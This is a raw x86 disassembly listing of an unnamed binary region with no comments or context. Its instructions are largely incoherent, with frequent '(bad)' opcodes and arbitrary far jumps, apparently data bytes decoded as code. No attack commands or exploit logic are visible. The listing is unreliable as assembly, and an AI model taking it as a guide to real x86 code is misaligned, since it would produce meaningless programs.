  427230:	cmp    ebp,DWORD PTR [ebx+eax*2-0x63]
  427234:	cs sbb al,0x15
  427237:	pop    edx
  427238:	add    BYTE PTR [edx],ah
  42723a:	fimul  DWORD PTR [ebx+0x341cd18e]
  427240:	push   ds
  427241:	push   ebp
  427242:	call   0x156efc11
  427247:	push   es
  427248:	xor    DWORD PTR [ebp+ebp*1+0x62],0xffffff94
  42724d:	call   0xcb3d:0xc65802cf
  427254:	mov    ah,ah
  427256:	cmp    ecx,DWORD PTR [edi+0x6f]
  427259:	fnstenv [eax+0x28]
  42725c:	adc    DWORD PTR ds:0x34ddc4e7,esp
  427262:	repnz enter 0x7b87,0xe2
  427267:	repz lahf 
  427269:	dec    ebx
  42726a:	lahf   
  42726b:	retf   
  42726c:	hlt    
  42726d:	lock dec eax
  42726f:	lods   al,BYTE PTR ds:[esi]
  427270:	or     eax,0x105ff4b5
  427275:	aad    0x1a
  427277:	int3   
  427278:	rcl    BYTE PTR [ebx+ecx*1-0x6878f523],cl
  42727f:	fcom   QWORD PTR [ebx*8-0x3b232e4a]
  427286:	aaa    
  427287:	shr    DWORD PTR [ebp*1+0x55a1355b],0x29
  42728f:	cmp    dh,BYTE PTR [ecx]
  427291:	pushf  
  427292:	loopne 0x4272f2
  427294:	int3   
  427295:	cdq    
  427296:	dec    edx
  427297:	in     eax,dx
  427298:	ficomp WORD PTR [edx]
  42729a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42729b:	and    al,0x55
  42729d:	mov    al,0x78
  42729f:	mov    ecx,0xc28b9016
  4272a4:	inc    edi
  4272a5:	xor    esi,DWORD PTR [esi-0x3d]
  4272a8:	cdq    
  4272a9:	fist   DWORD PTR [ebx-0x12a12a3e]
  4272af:	push   ebp
  4272b0:	or     BYTE PTR ds:0x4792808c,ch
  4272b6:	mov    cl,0xed
  4272b8:	xor    BYTE PTR [ebx-0x15a27b49],bl
  4272be:	ins    DWORD PTR es:[edi],dx
  4272bf:	out    dx,eax
  4272c0:	cli    
  4272c1:	cdq    
  4272c2:	adc    DWORD PTR [eax+ebp*2+0x65],esi
  4272c6:	jmp    0x9ab3:0x4dee1b90
  4272cd:	sbb    edx,DWORD PTR [eax]
  4272cf:	xchg   edi,eax
  4272d0:	adc    al,0x8c
  4272d2:	lods   eax,DWORD PTR ds:[esi]
  4272d3:	test   BYTE PTR [eax-0x7],0x90
  4272d7:	inc    eax
  4272d8:	add    eax,0xd2d96c60
  4272dd:	jnp    0x427317
  4272df:	fistp  WORD PTR [ebp-0x5983ad8e]
  4272e5:	js     0x4272d3
  4272e7:	xchg   edi,eax
  4272e8:	ja     0x427324
  4272ea:	pop    esi
  4272eb:	enter  0x8e9f,0xae
  4272ef:	pop    ebx
  4272f0:	call   0x6ba1:0xc223b76e
  4272f7:	pop    es
  4272f8:	je     0x427348
  4272fa:	push   ebp
  4272fb:	outs   dx,BYTE PTR ds:[esi]
  4272fc:	lods   al,BYTE PTR ds:[esi]
  4272fd:	shr    BYTE PTR ds:0xb7d21ae4,cl
  427303:	sahf   
  427304:	lods   eax,DWORD PTR ds:[esi]
  427305:	es jmp 0xe5c164ed
  42730b:	sbb    eax,0xc19cbf29
  427310:	sub    esi,esi
  427312:	fcom   QWORD PTR [edi+0x72]
  427315:	jecxz  0x42738a
  427317:	fsubr  QWORD PTR [ebx+0x76]
  42731a:	movups xmm4,XMMWORD PTR ds:[eax-0x30]
  42731f:	int3   
  427320:	repz cmp ah,bh
  427323:	aas    
  427324:	mov    ch,0x63
  427326:	inc    eax
  427327:	in     al,0x59
  427329:	int3   
  42732a:	test   DWORD PTR [esi+0x1e2ae16c],0xe4cc548c
  427334:	fwait
	...
  427395:	add    BYTE PTR [edx],dl
  427397:	sbb    eax,0xaf3f8832
  42739c:	mov    edx,0x57f28d9f
  4273a1:	push   esp
  4273a2:	ret    
  4273a3:	cmc    
  4273a4:	mov    ?,WORD PTR [esi+0x1a28f]
  4273aa:	pop    es
  4273ab:	add    DWORD PTR [eax],eax
  4273ad:	add    BYTE PTR [ebx],dl
  4273af:	sbb    al,0x9c
  4273b1:	enter  0x353f,0xfd
  4273b5:	(bad)  
  4273b6:	jne    0x427368
  4273b8:	outs   dx,DWORD PTR ds:[esi]
  4273b9:	push   ss
  4273ba:	fidivr WORD PTR [ebp+0xf]
  4273bd:	xor    BYTE PTR [edx+0x5fad12d9],0xde
  4273c4:	sahf   
  4273c5:	jno    0x427405
  4273c7:	add    DWORD PTR [edi+edx*1],esi
  4273ca:	and    BYTE PTR [ebp-0x7ebf694],bh
  4273d0:	mov    ebx,0x6b272468
  4273d5:	fcomp  DWORD PTR [ebp-0x19]
  4273d8:	xor    edx,DWORD PTR [ebx+0x76]
  4273db:	js     0x4273ab
  4273dd:	out    0x1d,al
  4273df:	pop    ds
  4273e0:	jae    0x427394
  4273e2:	jp     0x42736c
  4273e4:	fs push edi
  4273e6:	jmp    0x688d345f
  4273eb:	mov    ds:0xca795dd3,al
  4273f0:	retf   0xc8f7
  4273f3:	(bad)  
  4273f4:	or     eax,0xc10f7289
  4273f9:	out    dx,al
  4273fa:	jae    0x4273ec
  4273fc:	js     0x427410
  4273fe:	xchg   DWORD PTR [esi+eax*2],edi
  427401:	cdq    
  427402:	xchg   ebp,eax
  427403:	push   edx
  427404:	fisubr WORD PTR [edi]
  427406:	pushf  
  427407:	jl     0x427426
  427409:	(bad)  [ebx-0x73]
  42740c:	pop    ds
  42740d:	xor    edi,edx
  42740f:	xor    ah,BYTE PTR [edx+0x34]
  427412:	push   ss
  427413:	lods   al,BYTE PTR ds:[esi]
  427414:	loope  0x427426
  427416:	mov    edx,0x7cb73e53
  42741b:	int    0x91
  42741d:	sbb    BYTE PTR [eax],ch
  42741f:	jne    0x4273de
  427421:	test   BYTE PTR [edi+0x2a38c499],dh
  427427:	sub    al,0x84
  427429:	es jp  0x4273c3
  42742c:	xchg   edi,eax
  42742d:	fimul  WORD PTR [ebx-0x1e]
  427430:	inc    ebx
  427431:	cmp    BYTE PTR [ebp+0x5a],ch
  427434:	cdq    
  427435:	ret    0x3b4b
  427438:	inc    ebp
  427439:	adc    ecx,0xffffffb4
  42743c:	xchg   esi,eax
  42743d:	jle    0x427472
  42743f:	inc    ebx
  427440:	stc    
  427441:	mov    bh,0x3d
  427443:	lods   eax,DWORD PTR ds:[esi]
  427444:	adc    ebx,edx
  427446:	fmul   st(3),st
  427448:	jmp    0xfee3:0x6e9e9821
  42744f:	jecxz  0x427439
  427451:	pop    ds
  427452:	mov    esi,0xc55392ee
  427457:	dec    ebp
  427458:	jns    0x4274b3
  42745a:	xchg   edi,eax
  42745b:	mov    eax,0xb01cf24c
  427460:	and    DWORD PTR [edi+0x3df04cc4],edi
  427466:	jmp    0x3d10af99
  42746b:	cld    
  42746c:	sbb    edi,edi
  42746e:	mov    ebp,0x865b2a1e
  427473:	cld    
  427474:	push   es
  427475:	pop    eax
  427476:	js     0x427444
  427478:	and    edi,esp
  42747a:	imul   ebp,eax,0xffffffcb
  42747d:	in     eax,0x85
  42747f:	adc    eax,0x7df38122
  427484:	and    eax,DWORD PTR [edi]
  427486:	pushf  
  427487:	inc    edx
  427488:	pop    edi
  427489:	push   ecx
  42748a:	aaa    
  42748b:	push   edx
  42748c:	jnp    0x4274ff
  42748e:	jecxz  0x427476
  427490:	test   DWORD PTR [edi],edx
  427492:	mov    esp,ecx
  427494:	repnz sub dl,BYTE PTR [edx-0x7f]
  427498:	add    eax,0xb10d962b
  42749d:	push   edx
  42749e:	jmp    0x4274da
  4274a0:	mov    ch,0x97
  4274a2:	and    dh,BYTE PTR [edx-0x1aeb6335]
  4274a8:	shr    BYTE PTR [edx],0xc6
  4274ab:	push   ecx
  4274ac:	sbb    DWORD PTR [edi+esi*4+0x16],ecx
  4274b0:	cmp    bh,al
  4274b2:	test   esp,esp
  4274b4:	add    DWORD PTR [eax],eax
	...
  427516:	pop    esp
  427517:	test   al,0xc0
  427519:	stos   DWORD PTR es:[edi],eax
  42751a:	hlt    
  42751b:	jmp    0x42759c
  42751d:	jmp    DWORD PTR [ecx+0x3aa6f50a]
  427523:	mov    eax,0xa3967bd2
  427528:	add    DWORD PTR [eax],eax
  42752a:	pop    es
  42752b:	add    DWORD PTR [eax],eax
  42752d:	add    BYTE PTR [ecx+0x5e],bl
  427530:	cwde   
  427531:	(bad)  
  427532:	sbb    eax,0xebf8cc8c
  427537:	adc    BYTE PTR [ebx-0x6],ch
  42753a:	inc    ebp
  42753b:	(bad)  
  42753c:	mov    al,0xb8
  42753e:	xor    bh,bl
  427540:	cmp    ecx,DWORD PTR [eax+0x20]
  427543:	mov    edi,DWORD PTR [ecx+0x725a9321]
  427549:	cs js  0x427554
  42754c:	(bad)  
  42754d:	ja     0x427550
  42754f:	sbb    eax,eax
  427551:	gs in  al,0xd3
  427554:	push   edi
  427555:	mov    al,ds:0x6ea57106
  42755a:	adc    cl,BYTE PTR [esi]
  42755c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42755d:	into   
  42755e:	or     ebp,DWORD PTR [edi-0x79]
  427561:	leave  
  427562:	(bad)  
  427563:	add    ch,BYTE PTR [ebx-0x162e037a]
  427569:	(bad)  [edi-0x3485d1fa]
  42756f:	enter  0x713f,0x67
  427573:	mov    ds:0x3b79e307,eax
  427578:	add    edx,DWORD PTR [edx-0x21cec096]
  42757e:	xor    dh,BYTE PTR [ecx-0x14]
  427581:	into   
  427582:	and    al,0xd9
  427584:	cmp    ecx,edx
  427586:	inc    esp
  427587:	pop    esp
  427588:	loop   0x4275be
  42758a:	in     al,0x65
  42758c:	gs daa 
  42758e:	icebp  
  42758f:	fadd   st(1),st
  427591:	dec    edi
  427592:	popf   
  427593:	fdivr  QWORD PTR [esi]
  427595:	add    al,0x25
  427597:	pop    esi
  427598:	gs mov ecx,0x1eb4badf
  42759e:	xchg   esp,eax
  42759f:	bound  edi,QWORD PTR [edx-0x72]
  4275a2:	mul    DWORD PTR [edi-0x10ee2ddc]
  4275a8:	rol    esi,0xeb
  4275ab:	cmc    
  4275ac:	in     eax,dx
  4275ad:	pop    ebp
  4275ae:	fs pop ebp
  4275b0:	retf   0xa400
  4275b3:	loope  0x42756d
  4275b5:	add    bl,BYTE PTR [esi]
  4275b7:	inc    esi
  4275b8:	mov    ebp,0x382308b6
  4275bd:	mov    ebp,0x278dca90
  4275c2:	ret    0x2f82
  4275c5:	and    DWORD PTR [edi],edi
  4275c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4275c8:	leave  
  4275c9:	mov    cl,BYTE PTR [edi]
  4275cb:	lods   al,BYTE PTR ds:[esi]
  4275cc:	int3   
  4275cd:	call   0x8610:0x3ac50173
  4275d4:	shl    DWORD PTR [eax-0x25111ea],1
  4275da:	push   cs
  4275db:	cmp    DWORD PTR [edx-0x258b4f0b],0x1a
  4275e2:	mov    ecx,0xc76b7ce1
  4275e7:	pushf  
  4275e8:	cmp    dh,bh
  4275ea:	cmp    bh,BYTE PTR [ebx+0x232f426d]
  4275f0:	jo     0x427612
  4275f2:	and    eax,0xbfa05be1
  4275f7:	sbb    DWORD PTR [ebx],ecx
  4275f9:	stos   BYTE PTR es:[edi],al
  4275fa:	rcl    DWORD PTR [eax-0x21],1
  4275fd:	dec    edx
  4275fe:	pushf  
  4275ff:	fsubr  st(3),st
  427601:	xlat   BYTE PTR ds:[ebx]
  427602:	pop    edi
  427603:	jmp    0x427639
  427605:	fdivr  st(2),st
  427607:	pop    ds
  427608:	pop    ebx
  427609:	outs   dx,DWORD PTR ds:[esi]
  42760a:	sub    eax,DWORD PTR cs:[edi-0x69119fa5]
  427611:	les    edi,FWORD PTR [ecx]
  427613:	fadd   DWORD PTR [eax]
  427615:	xchg   ebp,eax
  427616:	cmp    eax,0xbf3c8d5a
  42761b:	aas    
  42761c:	imul   esi,DWORD PTR [eax],0xfffffffd
  42761f:	fcomp  QWORD PTR [edi+0x41]
  427622:	dec    edi
  427623:	xor    DWORD PTR [ebp-0x3b],ebx
  427626:	inc    ecx
  427627:	js     0x42764d
  427629:	push   0xffffff8a
  42762b:	adc    eax,0x1668e679
  427630:	mov    bl,0xe0
  427632:	lods   al,BYTE PTR ds:[esi]
  427633:	repz add DWORD PTR [eax],0x0
	...
  427696:	add    DWORD PTR [esi-0x70],edx
  427699:	out    dx,al
  42769a:	xlat   BYTE PTR ds:[ebx]
  42769b:	out    dx,al
  42769c:	jg     0x42769d
  42769e:	xchg   edi,eax
  42769f:	in     eax,dx
  4276a0:	imul   ebx,eax,0xc608f65e
  4276a6:	popf   
  4276a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4276a8:	add    DWORD PTR [eax],eax
  4276aa:	pop    es
  4276ab:	add    DWORD PTR [eax],eax
  4276ad:	add    BYTE PTR [esi+0x1b],al
  4276b0:	in     al,dx
  4276b1:	dec    edi
  4276b2:	cmp    bl,BYTE PTR [esi+0x3f]
  4276b5:	jae    0x42764b
  4276b7:	dec    eax
  4276b8:	inc    ebp
  4276b9:	add    DWORD PTR [edx],ebp
  4276bb:	or     bh,al
  4276bd:	mov    cs,WORD PTR [esi]
  4276bf:	xor    ebp,DWORD PTR [eax+0x51]
  4276c2:	nop
  4276c3:	lock push esp
  4276c5:	sbb    BYTE PTR [si],ah
  4276c8:	mov    edi,0x89093a13
  4276cd:	int3   
  4276ce:	ja     0x42771f
  4276d0:	mov    ebp,0x2eefc86f
  4276d5:	cmp    esi,DWORD PTR [ecx+0x3ef0e056]
  4276db:	jnp    0x42766b
  4276dd:	loop   0x427675
  4276df:	xor    bl,bl
  4276e1:	cs inc edi
  4276e3:	test   DWORD PTR [edi],ebx
  4276e5:	xor    edi,esi
  4276e7:	add    BYTE PTR [eax+0x4e],dh
  4276ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4276eb:	push   ss
  4276ec:	dec    ebx
  4276ed:	or     ebp,esp
  4276ef:	leave  
  4276f0:	imul   ebp,DWORD PTR [eax+edi*2+0x53],0xb2f519d7
  4276f8:	mov    ds:0x18d0c55d,eax
  4276fd:	mov    cl,0x75
  4276ff:	(bad)  
  427701:	inc    esi
  427702:	mov    dh,0x9d
  427704:	daa    
  427705:	mov    ebx,0x4485c22f
  42770a:	inc    edi
  42770b:	mov    edi,0x8284370b
  427710:	sbb    eax,DWORD PTR [eax+0x7f92c00e]
  427716:	data16 in al,dx
  427718:	mov    ebp,DWORD PTR [eax+0x5f4501f8]
  42771e:	es xchg ebx,eax
  427720:	mov    ah,0x53
  427722:	std    
  427723:	into   
  427724:	rcl    BYTE PTR [edx],1
  427726:	jb     0x42776e
  427728:	inc    ecx
  427729:	sbb    esp,DWORD PTR [eax+0x5a]
  42772c:	sbb    DWORD PTR [ebx+ebx*2],ebp
  42772f:	fmul   DWORD PTR [eax]
  427731:	lods   eax,DWORD PTR ds:[esi]
  427732:	adc    al,0x1c
  427734:	leave  
  427735:	pusha  
  427736:	xchg   ecx,eax
  427737:	or     al,0x28
  427739:	lock cli 
  42773b:	xchg   BYTE PTR [ecx],ah
  42773d:	jmp    0x4276e3
  42773f:	and    esi,edi
  427741:	test   eax,0x95baa219
  427746:	ror    BYTE PTR [ebx+0x58],1
  427749:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42774a:	sub    al,0x8b
  42774c:	ret    
  42774d:	leave  
  42774e:	and    DWORD PTR [edx-0x590bb5cc],ebp
  427754:	xor    eax,0xa04c9e20
  427759:	jge    0x42774f
  42775b:	xchg   ecx,eax
  42775c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42775d:	cmp    BYTE PTR [edx],ah
  42775f:	lahf   
  427760:	(bad)  
  427761:	cmp    eax,0x1ebc6edf
  427766:	out    0x79,al
  427768:	aaa    
  427769:	(bad)  [esi]
  42776b:	test   BYTE PTR [edx-0x3e],al
  42776e:	push   esi
  42776f:	loop   0x427796
  427771:	mov    eax,0x4a630e01
  427776:	and    DWORD PTR [edx-0xb],edi
  427779:	and    eax,0xdfe1b928
  42777e:	cmp    al,0x10
  427780:	add    DWORD PTR [ebx+edi*8+0x4c6ff849],esi
  427787:	sbb    cl,BYTE PTR [edx-0x673b62d6]
  42778d:	cmp    BYTE PTR [ecx],dl
  42778f:	(bad)  
  427790:	fnstsw WORD PTR [esi+0x5205686e]
  427796:	jb     0x4277db
  427798:	sbb    bh,BYTE PTR [esi-0x44]
  42779b:	jg     0x427773
  42779d:	jbe    0x427736
  42779f:	push   eax
  4277a0:	xchg   esp,eax
  4277a1:	test   DWORD PTR [ecx-0x46],esp
  4277a4:	int3   
  4277a5:	(bad)  
  4277a6:	paddsw mm6,QWORD PTR [ecx+0xbdf0dfc]
  4277ad:	mov    dh,0x3
  4277af:	sbb    dl,bl
  4277b1:	ret    
  4277b2:	xor    ebx,edx
  4277b4:	lds    eax,FWORD PTR [eax]
	...
  427816:	sbb    cl,BYTE PTR [edx-0x3a64baf5]
  42781c:	pop    esi
  42781d:	fist   WORD PTR [edx-0x2f]
  427820:	cmp    al,0x27
  427822:	sbb    BYTE PTR [ebp+0x79],0xc1
  427826:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427827:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427828:	add    DWORD PTR [eax],eax
  42782a:	pop    es
  42782b:	add    DWORD PTR [eax],eax
  42782d:	add    BYTE PTR [edi+eax*4],al
  427830:	ret    0x4c8f
  427833:	jp     0x427867
  427835:	mov    ds:0xe585524b,eax
  42783a:	and    DWORD PTR [ebx+0x1e5016c1],edx
  427840:	xor    ch,dl
  427842:	jne    0x427804
  427844:	popf   
  427845:	mov    edx,0xa1d1a5f
  42784a:	and    DWORD PTR [esi],0x56
  42784d:	arpl   WORD PTR [eax],sp
  42784f:	sub    eax,0x9b7b1d93
  427854:	mov    ebp,0x7b73a46d
  427859:	cmp    dh,0x81
  42785c:	cmp    eax,0x7412fe71
  427861:	sar    DWORD PTR [esi],1
  427863:	and    al,0xaf
  427865:	outs   dx,BYTE PTR ds:[esi]
  427866:	mov    al,ds:0xd5ca8118
  42786b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42786c:	mov    eax,0x77289d76
  427871:	mov    dl,0x13
  427873:	jae    0x42781d
  427875:	adc    al,0x84
  427877:	mov    al,0x73
  427879:	mov    dl,bl
  42787b:	jno    0x4278f4
  42787d:	rol    DWORD PTR [esi+edi*4-0x70],cl
  427881:	mov    ah,0x85
  427883:	aaa    
  427884:	jmp    FWORD PTR [esi-0x1b39b723]
  42788a:	jnp    0x42784c
  42788c:	jecxz  0x4278e6
  42788e:	sar    bh,0x37
  427891:	push   0x4d750ae3
  427896:	xchg   esp,eax
  427897:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427898:	fisttp DWORD PTR [ebx+edi*2+0x7f313def]
  42789f:	push   cs
  4278a0:	pinsrw mm0,WORD PTR [esi+ebx*8],0xa6
  4278a5:	sbb    eax,0x1489c30c
  4278aa:	pop    ebx
  4278ab:	int3   
  4278ac:	xor    ebp,DWORD PTR [ecx-0xf]
  4278af:	sbb    BYTE PTR [esi],bl
  4278b1:	adc    edi,esp
  4278b3:	push   0xffffff87
  4278b5:	(bad)  
  4278b6:	mov    ebp,0xcc564b01
  4278bb:	dec    eax
  4278bc:	xchg   ecx,eax
  4278bd:	pushf  
  4278be:	pop    es
  4278bf:	push   ds
  4278c0:	inc    edx
  4278c1:	sbb    esp,DWORD PTR [ebx-0x59]
  4278c4:	mov    eax,ds:0x80910639
  4278c9:	cld    
  4278ca:	aam    0x98
  4278cc:	jbe    0x427891
  4278ce:	xchg   edi,eax
  4278cf:	popa   
  4278d0:	jl     0x427933
  4278d2:	dec    edx
  4278d3:	cmp    BYTE PTR [edx+edi*4],cl
  4278d6:	rol    DWORD PTR [ebp-0x6135752e],0x23
  4278dd:	les    ecx,FWORD PTR [edx+ebx*1]
  4278e0:	sbb    edi,eax
  4278e2:	jle    0x427878
  4278e4:	sbb    cl,0xc8
  4278e7:	inc    esi
  4278e8:	rol    DWORD PTR [ebx+ebp*8+0x1ad70fff],cl
  4278ef:	ds out 0x84,al
  4278f2:	imul   ebx,DWORD PTR [ebx+0x5af0dd7],0x12527782
  4278fc:	ins    DWORD PTR es:[edi],dx
  4278fd:	iret   
  4278fe:	mov    al,bl
  427900:	cld    
  427901:	sbb    al,0xea
  427903:	rcr    ah,0x30
  427906:	push   esi
  427907:	mov    ds:0x49f921b7,al
  42790c:	push   ss
  42790d:	dec    esp
  42790e:	xchg   edx,eax
  42790f:	popf   
  427910:	call   0xb168604
  427915:	adc    al,0xcb
  427917:	ja     0x42796c
  427919:	xchg   esp,ebx
  42791b:	pop    esp
  42791c:	test   eax,0x52a74367
  427921:	cmp    al,0x69
  427923:	stc    
  427924:	mov    ch,0xd9
  427926:	xchg   sp,ax
  427928:	pop    ds
  427929:	or     bl,cl
  42792b:	xor    al,0x6
  42792d:	jge    0x42795c
  42792f:	cwde   
  427930:	sbb    edx,0x2065f4
	...
  427996:	call   0xdea3:0xffa3ffdd
  42799d:	std    
  42799e:	in     eax,0x63
  4279a0:	mov    ebx,0x273682d0
  4279a5:	das    
  4279a6:	stos   DWORD PTR es:[edi],eax
  4279a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4279a8:	add    DWORD PTR [eax],eax
  4279aa:	pop    es
  4279ab:	add    DWORD PTR [eax],eax
  4279ad:	add    BYTE PTR [edi+esi*2+0x1c3a4f56],ch
  4279b4:	icebp  
  4279b5:	pop    esi
  4279b6:	(bad)  
  4279b7:	out    dx,eax
  4279b8:	add    eax,0xa8314847
  4279bd:	dec    ecx
  4279be:	fmul   DWORD PTR [esi-0x78]
  4279c1:	and    BYTE PTR [ebx+0x6c],0xf3
  4279c5:	mov    ss,edi
  4279c7:	push   ss
  4279c8:	enter  0x9d01,0x81
  4279cc:	popa   
  4279cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4279ce:	ror    BYTE PTR [eax],1
  4279d0:	addr16 daa 
  4279d2:	frndint 
  4279d4:	dec    ebp
  4279d5:	xor    al,0x33
  4279d7:	mov    ss,ecx
  4279d9:	add    DWORD PTR [ecx-0x57],ebp
  4279dc:	div    edi
  4279de:	popf   
  4279df:	test   eax,edx
  4279e1:	frstor [ecx+0x22]
  4279e4:	retf   0x1aea
  4279e7:	or     bh,ch
  4279e9:	lods   eax,DWORD PTR ds:[esi]
  4279eb:	mov    al,0x50
  4279ed:	jecxz  0x427a3a
  4279ef:	(bad)  
  4279f0:	mov    bl,0x33
  4279f2:	call   0xe9fd:0xaa4a76e4
  4279f9:	test   al,0xf5
  4279fb:	call   0x5a8e:0x61c06fe5
  427a02:	sub    al,0x44
  427a04:	mov    ebp,0x9ca422e5
  427a09:	add    eax,0xa6cd9009
  427a0e:	not    BYTE PTR [ecx+ecx*8]
  427a11:	or     dh,0x62
  427a14:	(bad)  
  427a15:	lahf   
  427a16:	dec    edx
  427a17:	mov    ss,WORD PTR [ecx]
  427a19:	jns    0x427a71
  427a1b:	(bad)  
  427a1c:	call   0xf9cb:0x8302d7f3
  427a23:	jge    0x427a0b
  427a25:	sub    dl,dl
  427a27:	retf   0xb8e8
  427a2a:	cdq    
  427a2b:	pop    eax
  427a2c:	pop    ebp
  427a2d:	pop    ds
  427a2e:	jns    0x4279fa
  427a30:	ret    0xa4d0
  427a33:	xchg   edi,eax
  427a34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a36:	mov    ebx,0x9abc918f
  427a3b:	xor    ch,BYTE PTR [eax]
  427a3d:	int3   
  427a3e:	adc    ah,BYTE PTR [eax*1-0x4bfe12b0]
  427a45:	enter  0xe56b,0x3f
  427a49:	mov    ?,WORD PTR [edx-0x6c]
  427a4c:	stc    
  427a4d:	inc    edx
  427a4e:	jmp    0x2305:0xeef79aad
  427a55:	fidiv  WORD PTR [edi]
  427a57:	outs   dx,DWORD PTR ds:[esi]
  427a58:	out    dx,al
  427a59:	mov    al,0xa0
  427a5b:	cmp    BYTE PTR [ecx+0x76],dl
  427a5e:	cmp    eax,0x4940aaad
  427a63:	jmp    0x5b5d3528
  427a68:	mov    eax,ds:0xfbff8f7
  427a6d:	jle    0x427a29
  427a6f:	or     edi,DWORD PTR [esi-0x32988111]
  427a75:	out    0xc,eax
  427a77:	retf   
  427a78:	(bad)  
  427a7a:	xor    al,0x6e
  427a7c:	popf   
  427a7d:	inc    esp
  427a7e:	adc    ebp,DWORD PTR [eax]
  427a80:	push   es
  427a81:	xchg   ebp,ecx
  427a83:	mov    esp,0xb8a20d5a
  427a88:	pushf  
  427a89:	mov    edi,0xdf845314
  427a8e:	add    cl,BYTE PTR [edx]
  427a90:	lock push 0xb
  427a93:	icebp  
  427a94:	ds pop ebp
  427a96:	push   es
  427a97:	inc    edx
  427a98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a99:	scas   eax,DWORD PTR es:[di]
  427a9b:	dec    edi
  427a9c:	aaa    
  427a9d:	or     BYTE PTR [ebx],cl
  427a9f:	cwde   
  427aa0:	int    0x2b
  427aa2:	xchg   edi,eax
  427aa3:	add    al,0xe9
  427aa5:	adc    DWORD PTR [ebp-0x21f6675],ecx
  427aab:	mov    eax,0xa54f2437
  427ab0:	inc    ebx
  427ab1:	test   eax,0xe9a866
	...
  427b16:	retf   0x528b
  427b19:	jnp    0x427b6e
  427b1b:	sti    
  427b1c:	jmp    0x427ad9
  427b1e:	pop    edx
  427b1f:	dec    eax
  427b20:	pop    edx
  427b21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427b22:	js     0x427b82
  427b24:	cmp    BYTE PTR [edi],cl
  427b26:	mov    dl,0xa7
  427b28:	add    DWORD PTR [eax],eax
  427b2a:	pop    es
  427b2b:	add    DWORD PTR [eax],eax
  427b2d:	add    BYTE PTR [ebp-0x45],ah
  427b30:	adc    cl,BYTE PTR [eax-0x74]
  427b33:	mov    al,0x3d
  427b35:	and    cl,BYTE PTR [ebx-0x56]
  427b38:	shr    DWORD PTR [ecx+0xaec5134],cl
  427b3e:	sti    
  427b3f:	nop
  427b40:	mov    bh,0xe1
  427b42:	in     al,0x88
  427b44:	ja     0x427b3d
  427b46:	sub    eax,DWORD PTR [edx]
  427b48:	shl    dl,cl
  427b4a:	xor    al,0x25
  427b4c:	mov    dl,BYTE PTR [ebp-0x26]
  427b4f:	push   ecx
  427b50:	call   0x3ba1:0x9ca962ae
  427b57:	(bad)
  427b5a:	bound  esp,QWORD PTR [ecx+esi*1+0x5b]
  427b5e:	mov    eax,0xcb052a84
  427b63:	mov    ch,BYTE PTR [esp+eiz*8+0x70]
  427b67:	mov    eax,0x318c4c3c
  427b6c:	aad    0x3b
  427b6e:	xchg   ecx,eax
  427b6f:	enter  0x7594,0xa1
  427b73:	pop    edx
  427b74:	xchg   edi,eax
  427b75:	js     0x427bdf
  427b77:	sub    al,0x74
  427b79:	push   0x70c29d78
  427b7e:	inc    ebp
  427b7f:	add    DWORD PTR [edi+edx*1-0xa],ebx
  427b83:	outs   dx,BYTE PTR ds:[esi]
  427b84:	stos   BYTE PTR es:[edi],al
  427b85:	(bad)  
  427b86:	mov    al,ds:0x78402aea
  427b8b:	xchg   esp,eax
  427b8c:	popa   
  427b8d:	arpl   WORD PTR ds:0xf61ced05,si
  427b93:	and    eax,0x315eaa4d
  427b98:	fwait
  427b99:	pop    eax
  427b9a:	dec    ebp
  427b9b:	jo     0x427b9a
  427b9d:	pusha  
  427b9e:	cmp    BYTE PTR [eax-0x7bd0367f],bl
  427ba4:	push   0x7a
  427ba6:	mov    ds:0x30471817,eax
  427bab:	repz loope 0x427c22
  427bae:	les    eax,FWORD PTR [eax-0x20b65165]
  427bb4:	push   ebp
  427bb5:	mov    esp,DWORD PTR [edi+0x7b]
  427bb8:	es test al,0xe0
  427bbb:	sbb    eax,0x7a6950fb
  427bc0:	mov    bh,0x91
  427bc2:	mov    eax,ds:0x2e451688
  427bc7:	cmp    BYTE PTR [eax],cl
  427bc9:	jo     0x427bf6
  427bcb:	push   esp
  427bcc:	jmp    0x686b:0xff7974ae
  427bd3:	mov    DWORD PTR [edx+0x4f],ebx
  427bd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427bd7:	pop    ds
  427bd8:	push   ebp
  427bd9:	cs sahf 
  427bdb:	iret   
  427bdc:	xchg   ebp,eax
  427bdd:	nop
  427bde:	dec    ecx
  427bdf:	popf   
  427be0:	pop    edx
  427be1:	stc    
  427be2:	repnz bound esi,QWORD PTR [eax+0x54]
  427be6:	retf   
  427be7:	sbb    BYTE PTR [ebx+0x5d3c47d2],al
  427bed:	fcmovnb st,st(2)
  427bef:	mov    eax,DWORD PTR gs:[edi+0x50]
  427bf3:	outs   dx,BYTE PTR ds:[esi]
  427bf4:	add    esi,DWORD PTR [edi-0x7014e6bf]
  427bfa:	dec    edx
  427bfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427bfc:	mov    eax,ds:0x29879524
  427c01:	dec    esi
  427c02:	and    eax,0x5d004e9a
  427c07:	mov    esp,0x277b09d2
  427c0c:	sti    
  427c0d:	or     DWORD PTR [ecx+eiz*4+0x7e3f8d2d],ebx
  427c14:	mov    cl,0x2f
  427c16:	push   edi
  427c17:	stc    
  427c18:	bswap  ecx
  427c1a:	xchg   ecx,eax
  427c1b:	ja     0x427bf7
  427c1d:	call   0x8e7f9c23
  427c22:	xchg   edi,eax
  427c23:	repz xchg edi,eax
  427c25:	sbb    ah,BYTE PTR [esi+0x23da4d08]
  427c2b:	inc    ecx
